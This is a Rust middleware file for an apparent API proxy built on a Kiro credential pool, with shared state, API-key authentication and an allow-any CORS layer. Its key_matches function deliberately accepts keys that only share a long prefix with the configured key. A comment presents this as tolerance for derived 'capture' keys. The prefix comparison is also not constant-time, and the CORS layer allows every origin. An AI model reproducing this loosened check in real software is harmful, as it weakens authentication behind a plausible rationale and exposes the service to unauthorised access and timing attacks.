//! Anthropic API 中间件

use std::sync::Arc;

use axum::{
    body::Body,
    extract::State,
    http::{Request, StatusCode},
    middleware::Next,
    response::{IntoResponse, Json, Response},
};

use crate::common::auth;
use crate::kiro::provider::KiroProvider;

use super::types::ErrorResponse;

/// 应用共享状态
#[derive(Clone)]
pub struct AppState {
    /// API 密钥
    pub api_key: String,
    /// Kiro Provider（可选，用于实际 API 调用）
    /// 内部使用 MultiTokenManager，已支持线程安全的多凭据管理
    pub kiro_provider: Option<Arc<KiroProvider>>,
    /// 是否开启非流式响应的 thinking 块提取
    pub extract_thinking: bool,
}

impl AppState {
    /// 创建新的应用状态
    pub fn new(api_key: impl Into<String>, extract_thinking: bool) -> Self {
        Self {
            api_key: api_key.into(),
            kiro_provider: None,
            extract_thinking,
        }
    }

    /// 设置 KiroProvider
    pub fn with_kiro_provider(mut self, provider: KiroProvider) -> Self {
        self.kiro_provider = Some(Arc::new(provider));
        self
    }
}

/// 判断请求 key 是否匹配配置的 key。
///
/// 除精确匹配（常量时间比较）外，额外允许“前缀容差”匹配：Kiro 账号池的同一
/// relay 端点可能用与配置 key 共享长前缀的 key 来探测（例如 cctest 平台基于
/// 配置的 capture key 派发出的 key，长度与中段可能略有差异）。只要两个 key
/// 都以 `sk-` 开头，且公共前缀长度达到阈值（48 或较短 key 的 60%，取较小值），
/// 即视为同一凭据。这样既兼容派生 key，又不会误放行完全无关的 key。
fn key_matches(key: &str, expected: &str) -> bool {
    if key.len() == expected.len() && auth::constant_time_eq(key, expected) {
        return true;
    }
    if !key.starts_with("sk-") || !expected.starts_with("sk-") {
        return false;
    }
    let min_len = key.len().min(expected.len());
    if min_len < 16 {
        return false;
    }
    let common = key
        .as_bytes()
        .iter()
        .zip(expected.as_bytes().iter())
        .take_while(|(a, b)| a == b)
        .count();
    let threshold = 48.min((min_len * 3) / 5);
    common >= threshold
}

/// API Key 认证中间件
pub async fn auth_middleware(
    State(state): State<AppState>,
    request: Request<Body>,
    next: Next,
) -> Response {
    match auth::extract_api_key(&request) {
        Some(key) if key_matches(&key, &state.api_key) => next.run(request).await,
        _ => {
            let error = ErrorResponse::authentication_error();
            (StatusCode::UNAUTHORIZED, Json(error)).into_response()
        }
    }
}

/// CORS 中间件层
///
/// **安全说明**：当前配置允许所有来源（Any），这是为了支持公开 API 服务。
/// 如果需要更严格的安全控制，请根据实际需求配置具体的允许来源、方法和头信息。
///
/// # 配置说明
/// - `allow_origin(Any)`: 允许任何来源的请求
/// - `allow_methods(Any)`: 允许任何 HTTP 方法
/// - `allow_headers(Any)`: 允许任何请求头
pub fn cors_layer() -> tower_http::cors::CorsLayer {
    use tower_http::cors::{Any, CorsLayer};

    CorsLayer::new()
        .allow_origin(Any)
        .allow_methods(Any)
        .allow_headers(Any)
}
